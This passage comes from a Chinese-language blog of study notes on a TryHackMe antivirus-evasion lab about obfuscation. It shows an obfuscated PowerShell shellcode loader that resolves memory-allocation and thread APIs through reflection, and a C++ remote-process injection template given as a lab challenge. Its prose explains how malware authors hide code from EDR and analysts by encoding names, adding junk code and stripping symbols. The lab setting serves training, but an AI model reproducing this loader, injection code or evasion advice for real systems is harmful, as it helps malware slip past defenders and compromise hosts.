<span class="number">0</span>x17, <span class="number">0</span>x0b, <span class="number">0</span>x41, <span class="number">0</span>x54, <span class="number">0</span>x5d, <span class="number">0</span>x5f, <span class="number">0</span>x60, <span class="number">0</span>x4c, <span class="number">0</span>x57)</span><br><span class="line">[<span class="built_in">Byte</span>[]] <span class="variable">$ii5Ie</span> = <span class="selector-tag">@</span>(<span class="number">0</span>x34, <span class="number">0</span>x59, <span class="number">0</span>x61, <span class="number">0</span>x5a, <span class="number">0</span>x56, <span class="number">0</span>x50)</span><br><span class="line">[<span class="built_in">Byte</span>[]] <span class="variable">$KooG5</span> = <span class="selector-tag">@</span>(<span class="number">0</span>x38, <span class="number">0</span>x54, <span class="number">0</span>x4e, <span class="number">0</span>x5d, <span class="number">0</span>x5a, <span class="number">0</span>x5e, <span class="number">0</span>x5a, <span class="number">0</span>x51, <span class="number">0</span>x5f, <span class="number">0</span>x19, <span class="number">0</span>x42, <span class="number">0</span>x54, <span class="number">0</span>x59, <span class="number">0</span>x1e, <span class="number">0</span>x1d, <span class="number">0</span>x19, <span class="number">0</span>x40, <span class="number">0</span>x59, <span class="number">0</span>x5e, <span class="number">0</span>x4c, <span class="number">0</span>x51, <span class="number">0</span>x50, <span class="number">0</span>x39, <span class="number">0</span>x4c, <span class="number">0</span>x5f, <span class="number">0</span>x54, <span class="number">0</span>x61, <span class="number">0</span>x50, <span class="number">0</span>x38, <span class="number">0</span>x50, <span class="number">0</span>x5f, <span class="number">0</span>x53, <span class="number">0</span>x5a, <span class="number">0</span>x4f, <span class="number">0</span>x5e)</span><br><span class="line">[<span class="built_in">Byte</span>[]] <span class="variable">$io9iH</span> = <span class="selector-tag">@</span>(<span class="number">0</span>x32, <span class="number">0</span>x50, <span class="number">0</span>x5f, <span class="number">0</span>x3b, <span class="number">0</span>x5d, <span class="number">0</span>x5a, <span class="number">0</span>x4e, <span class="number">0</span>x2c, <span class="number">0</span>x4f, <span class="number">0</span>x4f, <span class="number">0</span>x5d, <span class="number">0</span>x50, <span class="number">0</span>x5e, <span class="number">0</span>x5e)</span><br><span class="line">[<span class="built_in">Byte</span>[]] <span class="variable">$Qui5i</span> = <span class="selector-tag">@</span>(<span class="number">0</span>x32, <span class="number">0</span>x50, <span class="number">0</span>x5f, <span class="number">0</span>x38, <span class="number">0</span>x5a, <span class="number">0</span>x4f, <span class="number">0</span>x60, <span class="number">0</span>x57, <span class="number">0</span>x50, <span class="number">0</span>x33, <span class="number">0</span>x4c, <span class="number">0</span>x59, <span class="number">0</span>x4f, <span class="number">0</span>x57, <span class="number">0</span>x50)</span><br><span class="line">[<span class="built_in">Byte</span>[]] <span class="variable">$xee2N</span> = <span class="selector-tag">@</span>(<span class="number">0</span>x56, <span class="number">0</span>x50, <span class="number">0</span>x5d, <span class="number">0</span>x59, <span class="number">0</span>x50, <span class="number">0</span>x57, <span class="number">0</span>x1e, <span class="number">0</span>x1d)</span><br><span class="line">[<span class="built_in">Byte</span>[]] <span class="variable">$AD0Pi</span> = <span class="selector-tag">@</span>(<span class="number">0</span>x41, <span class="number">0</span>x54, <span class="number">0</span>x5d, <span class="number">0</span>x5f, <span class="number">0</span>x60, <span class="number">0</span>x4c, <span class="number">0</span>x57, <span class="number">0</span>x2c, <span class="number">0</span>x57, <span class="number">0</span>x57, <span class="number">0</span>x5a, <span class="number">0</span>x4e)</span><br><span class="line">[<span class="built_in">Byte</span>[]] <span class="variable">$ahb3O</span> = <span class="selector-tag">@</span>(<span class="number">0</span>x41, <span class="number">0</span>x54, <span class="number">0</span>x5d, <span class="number">0</span>x5f, <span class="number">0</span>x60, <span class="number">0</span>x4c, <span class="number">0</span>x57, <span class="number">0</span>x3b, <span class="number">0</span>x5d, <span class="number">0</span>x5a, <span class="number">0</span>x5f, <span class="number">0</span>x50, <span class="number">0</span>x4e, <span class="number">0</span>x5f)</span><br><span class="line">[<span class="built_in">Byte</span>[]] <span class="variable">$yhe4c</span> = <span class="selector-tag">@</span>(<span class="number">0</span>x2E, <span class="number">0</span>x5D, <span class="number">0</span>x50, <span class="number">0</span>x4C, <span class="number">0</span>x5F, <span class="number">0</span>x50, <span class="number">0</span>x3F, <span class="number">0</span>x53, <span class="number">0</span>x5D, <span class="number">0</span>x50, <span class="number">0</span>x4C, <span class="number">0</span>x4F)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Get-Robf</span> <span class="params">(<span class="variable">$b3tz</span>)</span></span> {</span><br><span class="line">    <span class="variable">$aisN</span> = [<span class="type">System.Byte</span>[]]::new(<span class="variable">$b3tz</span>.Count)</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$x</span> = <span class="number">0</span>; <span class="variable">$x</span> <span class="operator">-lt</span> <span class="variable">$aisN</span>.Count; <span class="variable">$x</span>++) {</span><br><span class="line">       <span class="variable">$aisN</span>[<span class="variable">$x</span>] = (<span class="variable">$b3tz</span>[<span class="variable">$x</span>] + <span class="number">21</span>)</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> [<span class="type">System.Text.Encoding</span>]::ASCII.GetString(<span class="variable">$aisN</span>)</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Get-PA</span> <span class="params">(<span class="variable">$vmod</span>, <span class="variable">$vproc</span>)</span></span> {</span><br><span class="line">    <span class="variable">$a</span> = ([<span class="type">AppDomain</span>]::CurrentDomain.GetAssemblies() | <span class="built_in">Where-Object</span> { <span class="variable">$_</span>.GlobalAssemblyCache <span class="operator">-And</span> <span class="variable">$_</span>.Location.Split(<span class="string">'\\\\'</span>)[-<span class="number">1</span>].Equals(<span class="string">'System.dll'</span>) }).GetType((<span class="built_in">Get-Robf</span> <span class="variable">$KooG5</span>))</span><br><span class="line">    <span class="keyword">return</span> (<span class="variable">$a</span>.GetMethod((<span class="built_in">Get-Robf</span> <span class="variable">$io9iH</span>), [<span class="type">reflection.bindingflags</span>] <span class="string">"Public,Static"</span>, <span class="variable">$null</span>, [<span class="type">System.Reflection.CallingConventions</span>]::Any, <span class="selector-tag">@</span>((<span class="built_in">New-Object</span> System.Runtime.InteropServices.HandleRef).GetType(), [<span class="built_in">string</span>]), <span class="variable">$null</span>)).Invoke(<span class="variable">$null</span>, <span class="selector-tag">@</span>([<span class="type">System.Runtime.InteropServices.HandleRef</span>](<span class="built_in">New-Object</span> System.Runtime.InteropServices.HandleRef((<span class="built_in">New-Object</span> IntPtr), (<span class="variable">$a</span>.GetMethod((<span class="built_in">Get-Robf</span> <span class="variable">$Qui5i</span>))).Invoke(<span class="variable">$null</span>, <span class="selector-tag">@</span>(<span class="variable">$vmod</span>)))), <span class="variable">$vproc</span>))</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Get-TDef</span></span> {</span><br><span class="line">    <span class="keyword">Param</span> (</span><br><span class="line">        [<span class="type">Parameter</span>(<span class="type">Position</span> = <span class="number">0</span>, <span class="type">Mandatory</span> = <span class="variable">$True</span>)] [<span class="type">Type</span>[]] <span class="variable">$var_parameters</span>,</span><br><span class="line">        [<span class="type">Parameter</span>(<span class="type">Position</span> = <span class="number">1</span>)] [<span class="type">Type</span>] <span class="variable">$var_return_type</span> = [<span class="built_in">Void</span>]</span><br><span class="line">    )</span><br><span class="line">    <span class="variable">$vtdef</span> = [<span class="type">AppDomain</span>]::CurrentDomain.DefineDynamicAssembly((<span class="built_in">New-Object</span> System.Reflection.AssemblyName((<span class="built_in">Get-Robf</span> <span class="variable">$Ait1m</span>))), [<span class="type">System.Reflection.Emit.AssemblyBuilderAccess</span>]::Run).DefineDynamicModule((<span class="built_in">Get-Robf</span>  <span class="variable">$ahv3I</span>), <span class="variable">$false</span>).DefineType((<span class="built_in">Get-Robf</span> <span class="variable">$Moo5y</span>), (<span class="built_in">Get-Robf</span> <span class="variable">$ooR5o</span>), [<span class="type">System.MulticastDelegate</span>])</span><br><span class="line">    <span class="variable">$vtdef</span>.DefineConstructor((<span class="built_in">Get-Robf</span> <span class="variable">$Reib3</span>), [<span class="type">System.Reflection.CallingConventions</span>]::Standard, <span class="variable">$var_parameters</span>).SetImplementationFlags((<span class="built_in">Get-Robf</span> <span class="variable">$Reo5o</span>))</span><br><span class="line">    <span class="variable">$vtdef</span>.DefineMethod((<span class="built_in">Get-Robf</span> <span class="variable">$ii5Ie</span>), (<span class="built_in">Get-Robf</span> <span class="variable">$Thah8</span>), <span class="variable">$var_return_type</span>, <span class="variable">$var_parameters</span>).SetImplementationFlags((<span class="built_in">Get-Robf</span> <span class="variable">$Reo5o</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$vtdef</span>.CreateType()</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">[<span class="built_in">Byte</span>[]]<span class="variable">$vopcode</span> = <span class="selector-tag">@</span>(BADGER_SHELLCODE)</span><br><span class="line"></span><br><span class="line"><span class="variable">$vbuf</span> = ([<span class="type">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer((<span class="built_in">Get-PA</span> (<span class="built_in">Get-Robf</span> <span class="variable">$xee2N</span>) (<span class="built_in">Get-Robf</span> <span class="variable">$AD0Pi</span>)), (<span class="built_in">Get-TDef</span> <span class="selector-tag">@</span>([<span class="built_in">Int</span><span class="type">Ptr</span>], [<span class="type">UInt32</span>], [<span class="type">UInt32</span>], [<span class="type">UInt32</span>]) ([<span class="built_in">Int</span><span class="type">Ptr</span>])))).Invoke([<span class="built_in">Int</span><span class="type">Ptr</span>]::Zero, <span class="variable">$vopcode</span>.Length, <span class="number">0</span>x3000, <span class="number">0</span>x04)</span><br><span class="line">[<span class="type">System.Runtime.InteropServices.Marshal</span>]::<span class="built_in">Copy</span>(<span class="variable">$vopcode</span>, <span class="number">0</span>x0, <span class="variable">$vbuf</span>, <span class="variable">$vopcode</span>.length)</span><br><span class="line">([<span class="type">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer((<span class="built_in">Get-PA</span> (<span class="built_in">Get-Robf</span> <span class="variable">$xee2N</span>) (<span class="built_in">Get-Robf</span> <span class="variable">$ahb3O</span>)), (<span class="built_in">Get-TDef</span> <span class="selector-tag">@</span>([<span class="built_in">Int</span><span class="type">Ptr</span>], [<span class="type">UInt32</span>], [<span class="type">UInt32</span>], [<span class="type">UInt32</span>].MakeByRefType()) ([<span class="built_in">Bool</span>])))).Invoke(<span class="variable">$vbuf</span>, <span class="variable">$vopcode</span>.Length, <span class="number">0</span>x20, [<span class="type">ref</span>](<span class="number">0</span>)) | <span class="built_in">Out-Null</span></span><br><span class="line">([<span class="type">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer((<span class="built_in">Get-PA</span> (<span class="built_in">Get-Robf</span> <span class="variable">$xee2N</span>) (<span class="built_in">Get-Robf</span> <span class="variable">$yhe4c</span>)), (<span class="built_in">Get-TDef</span> <span class="selector-tag">@</span>([<span class="built_in">Int</span><span class="type">Ptr</span>], [<span class="type">UInt32</span>], [<span class="built_in">Int</span><span class="type">Ptr</span>], [<span class="built_in">Int</span><span class="type">Ptr</span>], [<span class="type">UInt32</span>], [<span class="built_in">Int</span><span class="type">Ptr</span>].MakeByRefType()) ([<span class="type">UInt32</span>])))).Invoke(<span class="number">0</span>, <span class="number">0</span>, <span class="variable">$vbuf</span>, [<span class="built_in">Int</span><span class="type">Ptr</span>]<span class="number">0</span>, <span class="number">0</span>, [<span class="type">ref</span>](<span class="number">0</span>)) | <span class="built_in">Out-Null</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>您可能会注意到一些 cmdlet 和函数保持其原始状态……这是为什么？ 根据您的目标，您可能希望创建一个应用程序，该应用程序在检测后仍然可以使逆向工程师感到困惑，但可能不会立即看起来可疑。 如果恶意软件开发人员混淆所有 cmdlet 和函数，则会增加解释语言和编译语言的熵，从而导致更高的 EDR 警报分数。 如果解释的片段看似随机或明显严重混淆，它还可能导致日志中出现可疑的解释片段。</p>
+<h3 id="代码结构"><a href="#代码结构" class="headerlink" title="代码结构"></a>代码结构</h3><p>在处理经常被忽视且不易识别的恶意代码的各个方面时，代码结构可能是一个令人烦恼的问题。 如果解释语言和编译语言都没有得到充分解决，则可能会导致分析人员签名或更容易进行逆向工程。</p>
+<p>正如上述分类学论文中所述，<strong>垃圾代码</strong>和<strong>重新排序代码</strong>都被广泛用作附加措施来增加解释程序的复杂性。 由于该程序未经编译，因此分析人员可以更深入地了解该程序，并且如果没有人为地夸大复杂性，他们可以专注于应用程序的确切恶意功能。</p>
+<p>相关代码的分离可能会影响解释语言和编译语言，并导致可能难以识别的隐藏签名。 启发式签名引擎可以根据周围的函数或 API 调用来确定程序是否是恶意的。 为了规避这些签名，攻击者可以随机化相关代码的出现，以欺骗引擎，使其相信这是一个安全的调用或函数。</p>
+<h3 id="文件和编译属性"><a href="#文件和编译属性" class="headerlink" title="文件和编译属性"></a>文件和编译属性</h3><p>已编译二进制文件的更多次要方面（例如编译方法）可能看起来不是关键组件，但它们可以带来多种优势来帮助分析人员。 例如，如果程序被编译为调试版本，则分析人员可以获得所有可用的全局变量和其他程序信息。</p>
+<p>当程序被编译为调试版本时，编译器将包含一个符号文件。 符号通常有助于调试二进制映像，并且可以包含全局和局部变量、函数名称和入口点。 攻击者必须意识到这些可能的问题，以确保正确的编译实践，并且不会将任何信息泄露给分析人员。</p>
+<p>对于攻击者来说幸运的是，符号文件可以通过编译器或编译后轻松删除。 要从像<strong>Visual Studio</strong>这样的编译器中删除符号，我们需要将编译目标从“Debug”更改为“Release”或使用像<strong>mingw这样的轻量级编译器。</strong></p>
+<p>如果我们需要从预编译映像中删除符号，我们可以使用命令行实用程序：“strip”。</p>
+<p>前面提到的白皮书：<a target="_blank" rel="noopener" href="https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3">分层混淆分类法</a>，在<strong>code-element</strong>层的<strong>下很好地总结了这些实践 剥离冗余符号</strong>方法。</p>
+<p>下面是使用 strip 从 <strong>gcc</strong> 中编译的二进制文件中删除符号并启用调试的示例。</p>
+<p>在积极使用工具之前应考虑其他几个属性，例如熵或哈希。 这些概念包含在<a target="_blank" rel="noopener" href="https://tryhackme.com/room/signatureevasion">签名规避室</a>的任务 5 中。</p>
+<hr>
+<p>利用您在整个任务中积累的知识，使用 AttackBox 或您自己的虚拟机从下面的 C++ 源代码中删除任何有意义的标识符或调试信息。</p>
+<p>一旦充分混淆和剥离，使用“MingW32-G++”编译源代码并将其提交到“<a target="_blank" rel="noopener" href="http://10.10.194.26/%E2%80%9D%E7%9A%84%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%82">http://10.10.194.26/”的网络服务器。</a></p>
+<p>注意：文件名必须是“challenge-8.exe”才能接收标志。</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#include "windows.h"</span></span><br><span class="line"><span class="comment">#include &lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string&gt;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">{</span><br><span class="line">	unsigned char shellcode[] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">	HANDLE processHandle;</span><br><span class="line">	HANDLE remoteThread;</span><br><span class="line">	PVOID remoteBuffer;</span><br><span class="line">	string leaked = <span class="string">"This was leaked in the strings"</span>;</span><br><span class="line"></span><br><span class="line">	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[<span class="number">1</span>])));</span><br><span class="line">	cout &lt;&lt; <span class="string">"Handle obtained for"</span> &lt;&lt; processHandle;</span><br><span class="line">	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class="line">	cout &lt;&lt; <span class="string">"Buffer Created"</span>;</span><br><span class="line">	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);</span><br><span class="line">	cout &lt;&lt; <span class="string">"Process written with buffer"</span> &lt;&lt; remoteBuffer;</span><br><span class="line">	remoteThread = CreateRemoteThread(processHandle, NULL, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, <span class="number">0</span>, NULL);</span><br><span class="line">	CloseHandle(processHandle);</span><br><span class="line">	cout &lt;&lt; <span class="string">"Closing handle"</span> &lt;&lt; processHandle;</span><br><span class="line">	cout &lt;&lt; leaked;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">} </span><br></pre></td></tr></tbody></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://mikannse.space">Mikannse</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://mikannse.space/2024/04/08/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0ObfuscationPrinciples/">http://mikannse.space/2024/04/08/THM免杀学习ObfuscationPrinciples/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://mikannse.space" target="_blank">MikannseのSekai</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/%E5%85%8D%E6%9D%80/">免杀</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/04/09/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0SignatureEvasion/" title="THM免杀学习SignatureEvasion"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">THM免杀学习SignatureEvasion</div></div></a></div><div class="next-post pull-right"><a href="/2024/04/08/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0AVEvasionShellcode/" title="THM免杀学习AVEvasionShellcode"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">THM免杀学习AVEvasionShellcode</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/08/11/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0EvadingLoggingandMonitoring/" title="THM免杀学习EvadingLoggingandMonitoring"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-11</div><div class="title">THM免杀学习EvadingLoggingandMonitoring</div></div></a></div><div><a href="/2024/04/08/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0AVEvasionShellcode/" title="THM免杀学习AVEvasionShellcode"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-08</div><div class="title">THM免杀学习AVEvasionShellcode</div></div></a></div><div><a href="/2024/04/08/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0IntroductiontoAntivirus/" title="THM免杀学习IntroductiontoAntivirus"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-08</div><div class="title">THM免杀学习IntroductiontoAntivirus</div></div></a></div><div><a href="/2024/04/09/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0SignatureEvasion/" title="THM免杀学习SignatureEvasion"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-09</div><div class="title">THM免杀学习SignatureEvasion</div></div></a></div><div><a href="/2024/08/11/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0RuntimeDetectionEvasion/" title="THM免杀学习RuntimeDetectionEvasion"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-11</div><div class="title">THM免杀学习RuntimeDetectionEvasion</div></div></a></div><div><a href="/2024/06/15/AdvancedSQLInjectionTHM/" title="AdvancedSQLInjectionTHM"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-15</div><div class="title">AdvancedSQLInjectionTHM</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Mikannse</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">274</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mikannse/mikannse.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">暂时没有公告QAQ</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Origins-of-Obfuscation"><span class="toc-number">2.</span> <span class="toc-text">Origins of Obfuscation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Obfuscation%E2%80%99s-Function-for-Static-Evasion"><span class="toc-number">3.</span> <span class="toc-text">Obfuscation’s Function for Static Evasion</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Object-Concatenation"><span class="toc-number">4.</span> <span class="toc-text">Object Concatenation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Obfuscation%E2%80%99s-Function-for-Analysis-Deception"><span class="toc-number">5.</span> <span class="toc-text">Obfuscation’s Function for Analysis Deception</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Code-Flow-and-Logic"><span class="toc-number">6.</span> <span class="toc-text">Code Flow and Logic</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Arbitrary-Control-Flow-Patterns"><span class="toc-number">7.</span> <span class="toc-text">Arbitrary Control Flow Patterns</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Protecting-and-Stripping-Identifiable-Information"><span class="toc-number">8.</span> <span class="toc-text">Protecting and Stripping Identifiable Information</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Object-Names"><span class="toc-number">8.0.1.</span> <span class="toc-text">Object Names</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%BB%93%E6%9E%84"><span class="toc-number">8.0.2.</span> <span class="toc-text">代码结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%92%8C%E7%BC%96%E8%AF%91%E5%B1%9E%E6%80%A7"><span class="toc-number">8.0.3.</span> <span class="toc-text">文件和编译属性</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/11/pwncollegeAssembly30/" title="pwncollegeAssembly30">pwncollegeAssembly30</a><time datetime="2024-10-10T17:05:42.000Z" title="发表于 2024-10-11 01:05:42">2024-10-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/09/pwncollege%E6%B1%87%E7%BC%96%E5%85%A5%E9%97%A8/" title="pwncollege汇编入门">pwncollege汇编入门</a><time datetime="2024-10-09T14:39:52.000Z" title="发表于 2024-10-09 22:39:52">2024-10-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/05/Git%E9%80%9F%E6%88%90/" title="Git速成">Git速成</a><time datetime="2024-10-05T04:57:08.000Z" title="发表于 2024-10-05 12:57:08">2024-10-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/03/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%BA%8C)%E4%B9%8BVulnHubCorrosion2/" title="打靶记录(一六二)之VulnHubCorrosion2">打靶记录(一六二)之VulnHubCorrosion2</a><time datetime="2024-10-03T09:24:11.000Z" title="发表于 2024-10-03 17:24:11">2024-10-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/02/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%B8%80)%E4%B9%8BVulnHubDrippingBlues1/" title="打靶记录(一六一)之VulnHubDrippingBlues1">打靶记录(一六一)之VulnHubDrippingBlues1</a><time datetime="2024-10-02T05:16:28.000Z" title="发表于 2024-10-02 13:16:28">2024-10-02</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By Mikannse</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  const disqus_config = function () {
+    this.page.url = 'http://mikannse.space/2024/04/08/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0ObfuscationPrinciples/'
+    this.page.identifier = '/2024/04/08/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0ObfuscationPrinciples/'
+    this.page.title = 'THM免杀学习ObfuscationPrinciples'
+  }
+
+  const disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  btf.addModeChange('disqus', disqusReset)
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
